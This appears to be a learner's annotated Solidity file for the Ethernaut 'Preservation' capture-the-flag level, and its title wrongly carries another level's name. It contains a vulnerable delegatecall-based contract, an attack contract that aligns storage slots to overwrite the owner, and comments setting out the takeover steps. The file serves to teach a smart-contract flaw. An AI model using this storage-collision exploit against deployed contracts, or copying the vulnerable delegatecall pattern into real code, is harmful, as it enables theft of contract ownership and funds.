// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title GarekeeperOne
/// @author OpenZeppelin
/// @notice - A library shouldnt use solidity contract, so that the state wouldnt be changed by the library with the use of delegatecall
///         - memory slots can be manipulated to hack contracts with libraries that uses contracts
///         - delegatecalls calls another contract that will change the state of the current contract, so if a library is used instead of contract, then state wouldnt be changed
///         - check memory slots of contract and library contracts to find vulnerabilities
///         - 1. preservation contract  setFirstTime is called and instead of passing a normal uint, a uint(address is passed)
///         - What happens here is that the timezonelibrary1  conducts it own logic and changes the first memory slot, which is saved on the preservation contract
///         - once the timeZone1Library address is changed due to the LibraryContract
///         - 2. An attack can be conducted, since the timeZone1Library address is now your attack address
///         - Rerunning the setFirstTime while changing the value of the third memory slot will now make you the owner

///         As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. 
///         This is particularly true for contract libraries that have their own state. This example demonstrates why the library 
///         keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract PerseveranceAttackContract {
  address slot0;
  address slot1;
  address slot2;

  function setTime(uint _address) public {
    slot2 = address(uint160(_address));
  }
}

